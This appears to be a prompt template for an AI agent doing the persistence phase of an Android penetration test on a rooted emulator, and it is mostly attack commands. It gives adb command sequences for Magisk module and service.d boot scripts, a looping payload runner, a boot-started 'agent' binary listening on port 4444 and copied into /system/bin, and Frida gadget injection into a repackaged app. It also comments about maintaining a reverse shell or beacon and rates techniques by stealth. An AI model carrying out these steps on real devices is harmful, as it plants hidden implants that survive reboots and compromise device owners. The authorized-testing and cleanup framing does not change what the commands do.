# Persistence Phase Prompt

You are a senior Android security researcher establishing persistence mechanisms on a Genymotion emulator.

## Target Information
- **Device**: {target}
- **Objective**: {objective}
- **Current Access Level**: {context}

## Environment
- Genymotion Android emulator (x86_64)
- ADB rooted via `adb root`
- Device IP: 192.168.56.101:5555
- Root access confirmed

## Your Task

Establish persistence to maintain access across reboots and app updates. This is for authorized security testing only.

### 1. Magisk-Based Persistence (Recommended)

```
TECHNIQUE: Magisk Module Installation
DESCRIPTION: Systemless root with module support for persistent changes
PREREQUISITES: Bootloader unlocked, Magisk installed
COMMANDS:
  # Check Magisk status
  adb -s {device_ip}:5555 shell "su -c 'magisk -v'"

  # Create persistence module
  mkdir -p /data/adb/modules/persistence_test/{system,post-fs-data.d}

  # Create module.prop
  adb -s {device_ip}:5555 shell "su -c 'cat > /data/adb/modules/persistence_test/module.prop << EOF
id=persistence_test
name=Security Test Persistence
version=1.0
versionCode=1
author=pentest
description=Authorized security testing persistence
EOF'"

  # Add startup script
  adb -s {device_ip}:5555 shell "su -c 'cat > /data/adb/modules/persistence_test/post-fs-data.d/persist.sh << EOF
#!/system/bin/sh
# Runs at boot before Zygote
echo \"[\$(date)] Boot persistence triggered\" >> /data/local/tmp/persist.log
EOF'"

  adb -s {device_ip}:5555 shell "su -c 'chmod 755 /data/adb/modules/persistence_test/post-fs-data.d/persist.sh'"

VERIFICATION:
  # Reboot and check
  adb -s {device_ip}:5555 reboot
  # Wait for boot...
  adb -s {device_ip}:5555 shell "su -c 'cat /data/local/tmp/persist.log'"
RISK_LEVEL: medium
```

### 2. Init.d Script Persistence

```
TECHNIQUE: Init.d Script
DESCRIPTION: Execute scripts at boot via init.d
PREREQUISITES: Root access, init.d support (or Magisk)
COMMANDS:
  # Check for init.d support
  adb -s {device_ip}:5555 shell "su -c 'ls -la /system/etc/init.d/ 2>/dev/null || echo \"No init.d\"'"

  # Create via Magisk service.d (more reliable)
  adb -s {device_ip}:5555 shell "su -c 'cat > /data/adb/service.d/persist_service.sh << EOF
#!/system/bin/sh
# Runs at boot after Zygote
while true; do
  # Maintain reverse shell / beacon
  sleep 300
  echo \"[\$(date)] Heartbeat\" >> /data/local/tmp/heartbeat.log
done &
EOF'"

  adb -s {device_ip}:5555 shell "su -c 'chmod 755 /data/adb/service.d/persist_service.sh'"
RISK_LEVEL: medium
```

### 3. App-Level Persistence

```
TECHNIQUE: Persistent Background Service
DESCRIPTION: Install app that runs persistent background service
COMMANDS:
  # Option 1: Install monitoring APK
  adb -s {device_ip}:5555 install -g persistence_app.apk

  # Option 2: Modify existing app to add persistence
  # Inject broadcast receiver for BOOT_COMPLETED
  # Requires APK modification (apktool)

  # Grant autostart permissions (device-specific)
  adb -s {device_ip}:5555 shell settings put secure enabled_notification_listeners com.test.persist/.PersistService

  # Disable battery optimization
  adb -s {device_ip}:5555 shell dumpsys deviceidle whitelist +com.test.persist
RISK_LEVEL: low
```

### 4. Scheduled Task Persistence

```
TECHNIQUE: AlarmManager / JobScheduler
DESCRIPTION: Schedule persistent wake-up calls
COMMANDS:
  # Via ADB broadcast (trigger alarm)
  adb -s {device_ip}:5555 shell am broadcast \
    -a android.intent.action.BOOT_COMPLETED \
    -n com.test.persist/.BootReceiver

  # Create cron-like behavior via script
  adb -s {device_ip}:5555 shell "su -c 'cat > /data/local/tmp/cron.sh << EOF
#!/system/bin/sh
while true; do
  # Execute payload every 5 minutes
  /data/local/tmp/payload.sh
  sleep 300
done
EOF'"

  # Start in background
  adb -s {device_ip}:5555 shell "su -c 'nohup /data/local/tmp/cron.sh > /dev/null 2>&1 &'"
RISK_LEVEL: low
```

### 5. Binary Persistence

```
TECHNIQUE: Persistent Binary Deployment
DESCRIPTION: Deploy and auto-start native binaries
COMMANDS:
  # Push binary to persistent location
  adb -s {device_ip}:5555 push agent_binary /data/local/tmp/agent
  adb -s {device_ip}:5555 shell "su -c 'chmod 755 /data/local/tmp/agent'"

  # Create startup script
  adb -s {device_ip}:5555 shell "su -c 'cat > /data/adb/service.d/agent.sh << EOF
#!/system/bin/sh
/data/local/tmp/agent -d -p 4444 &
EOF'"

  adb -s {device_ip}:5555 shell "su -c 'chmod 755 /data/adb/service.d/agent.sh'"

  # Alternative: Copy to /system/bin (less stealthy but more persistent)
  adb -s {device_ip}:5555 shell "su -c 'mount -o rw,remount /system'"
  adb -s {device_ip}:5555 shell "su -c 'cp /data/local/tmp/agent /system/bin/'"
  adb -s {device_ip}:5555 shell "su -c 'mount -o ro,remount /system'"
RISK_LEVEL: high
```

### 6. Frida Gadget Injection

```
TECHNIQUE: Frida Gadget Persistence
DESCRIPTION: Inject Frida gadget into target app for persistent hooking
COMMANDS:
  # Download Frida gadget
  wget https://github.com/frida/frida/releases/download/16.0.0/frida-gadget-16.0.0-android-x86_64.so.xz
  unxz frida-gadget-16.0.0-android-x86_64.so.xz
  mv frida-gadget-16.0.0-android-x86_64.so libfrida-gadget.so

  # Extract APK
  adb -s {device_ip}:5555 pull /data/app/com.target.app-*/base.apk target.apk
  apktool d target.apk -o target_src

  # Inject gadget into lib directory
  mkdir -p target_src/lib/x86_64
  cp libfrida-gadget.so target_src/lib/x86_64/

  # Modify smali to load gadget at startup
  # Add to main activity's onCreate:
  # const-string v0, "frida-gadget"
  # invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V

  # Rebuild
  apktool b target_src -o target_gadget.apk
  apksigner sign --ks debug.keystore target_gadget.apk

  # Install modified APK
  adb -s {device_ip}:5555 uninstall com.target.app
  adb -s {device_ip}:5555 install target_gadget.apk
RISK_LEVEL: medium
```

### 7. Verification and Cleanup

```
ACTION: Verify persistence survives reboot
COMMANDS:
  # Reboot device
  adb -s {device_ip}:5555 reboot
  adb wait-for-device

  # Check persistence indicators
  adb -s {device_ip}:5555 shell "su -c 'cat /data/local/tmp/persist.log'"
  adb -s {device_ip}:5555 shell "su -c 'ps -A | grep -E \"(agent|persist)\"'"

  # Verify startup scripts ran
  adb -s {device_ip}:5555 shell "su -c 'ls -la /data/adb/service.d/'"
  adb -s {device_ip}:5555 shell "su -c 'dmesg | grep -i persist'"

ACTION: Cleanup (post-assessment)
COMMANDS:
  # Remove persistence module
  adb -s {device_ip}:5555 shell "su -c 'rm -rf /data/adb/modules/persistence_test'"

  # Remove service scripts
  adb -s {device_ip}:5555 shell "su -c 'rm /data/adb/service.d/persist_service.sh'"

  # Remove binaries
  adb -s {device_ip}:5555 shell "su -c 'rm /data/local/tmp/agent'"

  # Reboot to confirm cleanup
  adb -s {device_ip}:5555 reboot
```

## Output Format

```
TECHNIQUE: <persistence method>
SURVIVES: <reboot|app_update|factory_reset>
STEALTH_LEVEL: low|medium|high
PREREQUISITES: <required access/conditions>
COMMANDS:
  <step-by-step>
VERIFICATION: <how to confirm persistence>
CLEANUP: <how to remove>
RISK_LEVEL: low|medium|high
```

## Priority Order

1. Magisk modules (most reliable, survives updates)
2. service.d scripts (simple, effective)
3. Frida gadget (app-specific persistence)
4. Binary deployment (native persistence)
5. App-level (least reliable)

Generate persistence mechanisms appropriate for the engagement scope.
